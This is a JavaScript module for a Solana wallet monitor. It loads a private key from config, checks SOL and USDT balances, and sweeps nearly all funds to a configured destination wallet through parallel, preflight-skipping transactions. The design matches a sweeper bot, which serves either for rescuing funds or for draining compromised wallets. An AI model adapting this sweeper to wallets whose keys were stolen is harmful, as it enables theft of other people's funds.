const { Connection, Keypair, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const { getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID } = require('@solana/spl-token');
const AbstractChainMonitor = require('./AbstractChainMonitor');

class SolanaChainMonitor extends AbstractChainMonitor {
  constructor(config) {
    super('Solana', config);
    
    this.connections = [];
    this.mainConnection = null;
    this.keypair = null;
    
    this.rpcEndpoints = config.rpcEndpoints || [
      'https://api.mainnet-beta.solana.com'
    ];
    
    this.usdtMint = new PublicKey(config.usdtMint || 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB');
  }

  async setupConnection() {
    this.log('🔗 Testing Solana RPC connections...');
    
    const privateKeyArray = this.parsePrivateKey(this.config.privateKey);
    this.keypair = Keypair.fromSecretKey(privateKeyArray);
    
    for (let i = 0; i < this.rpcEndpoints.length; i++) {
      try {
        const connection = new Connection(this.rpcEndpoints[i], 'confirmed');
        
        await Promise.race([
          connection.getBlockHeight(),
          new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
        ]);
        
        this.connections.push(connection);
        this.log(`✅ RPC ${i} connected: ${this.rpcEndpoints[i]}`);
        
      } catch (error) {
        this.log(`❌ RPC ${i} failed: ${this.rpcEndpoints[i]}`);
      }
    }
    
    if (this.connections.length === 0) {
      throw new Error('❌ All Solana RPC endpoints failed!');
    }
    
    this.log(`🚀 ${this.connections.length} Solana RPC endpoints ready!\n`);
    
    this.mainConnection = this.connections[0];
    
    this.log(`🔑 Wallet: ${this.keypair.publicKey.toString()}`);
    this.log(`📍 Destination: ${this.destinationWallet}\n`);
  }

  parsePrivateKey(privateKey) {
    if (typeof privateKey === 'string') {
      if (privateKey.startsWith('[')) {
        return new Uint8Array(JSON.parse(privateKey));
      } else if (privateKey.length === 128) {
        const bytes = [];
        for (let i = 0; i < privateKey.length; i += 2) {
          bytes.push(parseInt(privateKey.substr(i, 2), 16));
        }
        return new Uint8Array(bytes);
      } else {
        const bs58 = require('bs58');
        return bs58.decode(privateKey);
      }
    }
    return new Uint8Array(privateKey);
  }

  async getBalances() {
    for (let i = 0; i < this.connections.length; i++) {
      try {
        const connection = this.connections[i];
        
        const solBalance = await connection.getBalance(this.keypair.publicKey);
        
        let usdtBalance = 0n;
        try {
          const tokenAccount = await getAssociatedTokenAddress(
            this.usdtMint,
            this.keypair.publicKey
          );
          
          const accountInfo = await connection.getTokenAccountBalance(tokenAccount);
          usdtBalance = BigInt(accountInfo.value.amount);
        } catch (error) {
        }
        
        return { 
          native: BigInt(solBalance), 
          usdt: usdtBalance, 
          rpcIndex: i 
        };
        
      } catch (error) {
        continue;
      }
    }
    
    throw new Error('All Solana RPCs failed');
  }

  async executeTransfer(solBalance, usdtAmount) {
    this.log(`\n🚀🚀 PARALLEL TRANSFER ACTIVATED! 🚀🚀`);
    this.log(`🔥 FIRE-AND-FORGET mode - NO waiting for confirmation!`);
    this.log(`💰 USDT: ${this.formatUSDTBalance(usdtAmount)} | SOL: ${this.formatNativeBalance(solBalance)}`);
    
    const allPromises = [];
    let usdtAttempted = false;
    let solAttempted = false;
    const txHashes = [];
    
    if (usdtAmount > 0n) {
      usdtAttempted = true;
      for (let i = 0; i < this.connections.length; i++) {
        allPromises.push(
          (async (index) => {
            try {
              const connection = this.connections[index];
              const destinationPubkey = new PublicKey(this.destinationWallet);
              
              const sourceTokenAccount = await getAssociatedTokenAddress(
                this.usdtMint,
                this.keypair.publicKey
              );
              
              const destTokenAccount = await getAssociatedTokenAddress(
                this.usdtMint,
                destinationPubkey
              );
              
              const transaction = new Transaction().add(
                createTransferInstruction(
                  sourceTokenAccount,
                  destTokenAccount,
                  this.keypair.publicKey,
                  usdtAmount,
                  [],
                  TOKEN_PROGRAM_ID
                )
              );
              
              const signature = await connection.sendTransaction(transaction, [this.keypair], {
                skipPreflight: true
              });
              
              txHashes.push({ type: 'USDT', txid: signature });
              this.log(`✅ USDT TX (RPC ${index}): ${signature}`);
              
              return { success: true, type: 'USDT', index };
              
            } catch (error) {
              this.log(`❌ USDT RPC ${index}: ${error.message}`);
              return { success: false, type: 'USDT', index };
            }
          })(i)
        );
      }
    }
    
    const rentExemption = 890880n;
    const estimatedFee = 5000n;
    const feeReserve = rentExemption + (estimatedFee * 10n);
    
    if (solBalance > feeReserve) {
      solAttempted = true;
      const amountToSend = solBalance - feeReserve;
      
      for (let i = 0; i < this.connections.length; i++) {
        allPromises.push(
          (async (index) => {
            try {
              const connection = this.connections[index];
              const destinationPubkey = new PublicKey(this.destinationWallet);
              
              const transaction = new Transaction().add(
                SystemProgram.transfer({
                  fromPubkey: this.keypair.publicKey,
                  toPubkey: destinationPubkey,
                  lamports: amountToSend
                })
              );
              
              const signature = await connection.sendTransaction(transaction, [this.keypair], {
                skipPreflight: true
              });
              
              txHashes.push({ type: 'SOL', txid: signature });
              this.log(`✅ SOL TX (RPC ${index}): ${signature}`);
              
              return { success: true, type: 'SOL', index };
              
            } catch (error) {
              this.log(`❌ SOL RPC ${index}: ${error.message}`);
              return { success: false, type: 'SOL', index };
            }
          })(i)
        );
      }
    }
    
    if (allPromises.length === 0) {
      return { success: false, txHashes: [] };
    }
    
    this.log(`🚀 Launching ${allPromises.length} fire-and-forget transfers...`);
    const results = await Promise.allSettled(allPromises);
    
    const successful = results.filter(r => r.status === 'fulfilled' && r.value.success);
    const usdtSuccess = successful.filter(r => r.value.type === 'USDT');
    const solSuccess = successful.filter(r => r.value.type === 'SOL');
    
    this.log(`\n📊 BROADCAST RESULTS:`);
    if (usdtAttempted) this.log(`   💵 USDT: ${usdtSuccess.length}/${this.connections.length} broadcasted`);
    if (solAttempted) this.log(`   💰 SOL: ${solSuccess.length}/${this.connections.length} broadcasted`);
    
    const hasUsdtSuccess = !usdtAttempted || usdtSuccess.length > 0;
    const hasSolSuccess = !solAttempted || solSuccess.length > 0;
    
    if (hasUsdtSuccess && hasSolSuccess) {
      this.log(`🎯 ASSETS BROADCASTED - Transfers in mempool!\n`);
      
      txHashes.forEach(tx => this.broadcastedTxHashes.add(tx.txid));
      
      return { success: true, txHashes };
    } else {
      this.log(`⚠️ Some broadcasts failed - will retry!\n`);
      return { success: false, txHashes: [] };
    }
  }

  formatNativeBalance(balance) {
    return `${(Number(balance) / LAMPORTS_PER_SOL).toFixed(6)} SOL`;
  }

  getMinimumNativeBalance() {
    return BigInt(LAMPORTS_PER_SOL) / 100n;
  }

  getExplorerUrl(txHash) {
    return `https://solscan.io/tx/${txHash}`;
  }
}

module.exports = SolanaChainMonitor;
